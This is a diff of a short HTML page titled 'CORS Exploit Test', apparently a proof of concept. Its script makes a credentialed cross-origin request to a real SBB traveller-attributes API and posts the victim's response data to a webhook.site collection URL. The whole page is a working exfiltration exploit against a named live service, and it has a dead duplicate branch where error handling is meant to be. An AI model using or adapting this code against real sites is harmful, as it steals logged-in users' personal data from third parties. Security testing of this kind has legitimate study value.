@@ -1,22 +1,39 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h1>CORS Exploit Testaa (XMLHttpRequest)</h1>
+<h1>CORS Exploit Test (XMLHttpRequest)</h1>
 <script>
+
 var xhr = new XMLHttpRequest();
-xhr.open('GET', 'https://freizeit.sbb.ch/de/auth-loading', true);
+xhr.open("GET", "https://freizeit.sbb.ch/web/proxy/peaksolution/b2c/b2capi/travellers/attributes", true);
 xhr.withCredentials = true;
+
 xhr.onreadystatechange = function() {
-  if (xhr.readyState == 4) {
-    fetch('https://webhook.site/2b7c7e86-be0e-4e2e-9e38-244039ab08f0', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ response: xhr.responseText })
+  if (xhr.readyState === 4) {
+    // Prepare to send the response to the webhook
+    var webhookXhr = new XMLHttpRequest();
+    webhookXhr.open("POST", "https://webhook.site/9a5c1df2-c3d2-4c76-b1a7-974946e22152", true);
+    webhookXhr.setRequestHeader("Content-Type", "application/json");
+
+    // Send the response as JSON
+    var payload = JSON.stringify({
+      response: xhr.responseText
     });
+    webhookXhr.send(payload);
+
+    // Optional: Log to console for debugging
+    console.log("Response sent to webhook:", xhr.responseText);
+  } else if (xhr.readyState === 4) {
+    console.error("Error fetching data:", xhr.status, xhr.statusText);
   }
 };
+
+// Handle network errors
+xhr.onerror = function() {
+  console.error("Network Error: Unable to fetch data from source URL");
+};
+
 xhr.send();
 </script>
 </body>
 </html>
-
